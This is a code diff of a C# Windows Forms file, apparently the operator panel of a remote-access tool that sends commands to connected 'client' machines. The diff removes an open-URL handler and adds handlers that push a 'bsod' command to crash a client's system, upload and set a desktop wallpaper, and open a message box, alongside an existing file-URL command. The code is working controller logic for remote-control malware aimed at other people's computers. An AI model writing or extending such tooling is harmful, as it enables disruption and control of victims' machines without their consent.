@@ -13,6 +13,7 @@ using System.Security.Cryptography;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Xml.Linq;
 
 namespace Sweep.Forms
 {
@@ -298,31 +299,7 @@ namespace Sweep.Forms
 
         private async void openURLToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            foreach (var obj in listView1.SelectedObjects)
-            {
-                ClientInfo item = (ClientInfo)obj;
-                if (item == null) { return; }
-                ;
 
-                ClientConnection conn = _server.GetConnectionById(item.ID);
-                if (conn != null)
-                {
-                    var input = Interaction.InputBox("Enter URL (Must include http:// or https://)", "Url", remembrance.GetAttribute<string>("website") ?? "https://example.com");
-
-                    if (String.IsNullOrEmpty(input))
-                    {
-                        return;
-                    }
-
-                    remembrance.SetAttribute("website", input);
-
-                    await _server.SendMessageToConnection(conn, new JObject
-                    {
-                        ["command"] = "url",
-                        ["body"] = input,
-                    }.ToString());
-                }
-            }
         }
         public static async Task<byte[]> ReadAllBytesAsync(string path)
         {
@@ -430,6 +407,85 @@ namespace Sweep.Forms
                         ["command"] = "fileurl",
                         ["body"] = input,
                     }.ToString());
+                }
+            }
+        }
+
+        private async void triggerBSODToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (var obj in listView1.SelectedObjects)
+            {
+                ClientInfo item = (ClientInfo)obj;
+                if (item == null) { return; }
+                ;
+
+                ClientConnection conn = _server.GetConnectionById(item.ID);
+                if (conn != null)
+                {
+                    var confirmation = MessageBox.Show("Are you sure you want to trigger a BSOD on this client? This will crash their system. May require elevated privileges.", "Confirm BSOD", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
+
+                    if (confirmation != DialogResult.Yes)
+                    {
+                        return; // User canceled the operation
+                    }
+
+                    await _server.SendMessageToConnection(conn, new JObject
+                    {
+                        ["command"] = "bsod"
+                    }.ToString());
+                }
+            }
+        }
+
+        private async void setWallpaperToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (var obj in listView1.SelectedObjects)
+            {
+                ClientInfo item = (ClientInfo)obj;
+                if (item == null) { return; }
+                ;
+
+                ClientConnection conn = _server.GetConnectionById(item.ID);
+                if (conn != null)
+                {
+                    var wallpaperdialog = new OpenFileDialog();
+                    wallpaperdialog.DefaultExt = "png";
+                    wallpaperdialog.Filter = "Image Files (*.png;*.jpg;*.jpeg)|*.png;*.jpg;*.jpeg|All files (*.*)|*.*";
+
+                    wallpaperdialog.InitialDirectory = remembrance.GetAttribute<string>("wallpaperfilepath") ?? Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+
+                    var dialog = wallpaperdialog.ShowDialog();
+
+                    if (dialog != DialogResult.OK) {
+                        return;
+                    }
+
+                    remembrance.SetAttribute("wallpaperfilepath", Path.GetDirectoryName(wallpaperdialog.FileName));
+
+                    var filebytes = await ReadAllBytesAsync(wallpaperdialog.FileName);
+
+                    await _server.SendFileBytesInline(conn.Id, filebytes, new JObject
+                    {
+                        ["command"] = "wallpaper",
+                        ["filename"] = Global.GenerateRandomString(10) + Path.GetFileName(wallpaperdialog.FileName)
+                    }.ToString());
+                }
+            }
+        }
+
+        private async void messageBoxToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (var obj in listView1.SelectedObjects)
+            {
+                ClientInfo item = (ClientInfo)obj;
+                if (item == null) { return; }
+                ;
+
+                ClientConnection conn = _server.GetConnectionById(item.ID);
+                if (conn != null)
+                {
+                    var wind = new MsgBox();
+                    wind.Show();
                 }
             }
         }
